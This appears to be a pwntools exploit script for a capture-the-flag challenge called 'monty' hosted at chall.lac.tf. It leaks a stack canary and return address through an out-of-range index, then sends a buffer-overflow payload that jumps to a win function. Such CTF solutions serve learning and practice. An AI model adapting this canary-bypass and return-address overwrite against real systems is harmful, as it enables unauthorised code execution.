from pwn import *

# exe = ELF("./monty")

# r = process([exe.path])

r = remote('chall.lac.tf',31132)

# consume some dumb lines at the beginning
r.recvline()
r.recvline()
r.recvline()
r.sendline("55")
s = r.recvline()
print(s) # example: b'index of your first peek? Peek 1: 12781217082206379264\n
canary_ = int(s[34:-1]) # the canary starts at the 34th character, and we don't want the newline at the end
print(canary_) #example: 12781217082206379264
canary = canary_.to_bytes(8, "little")
r.sendline("57")
r.recvline() #consume ===================
s = r.recvline()
retaddr_ = int(s[34:-1]) # same magic value as the canary read
# calculate the address of win
retaddr_ -= 48
retaddr_ -= 1045
target = retaddr_.to_bytes(8, "little")
r.sendline("1") # to answer "Show me the lady!"

#payload structure: padding(24), canary, padding(8), win
payload = b"A"*24 + canary + b"A"*8 + target
r.sendline(payload)

r.interactive()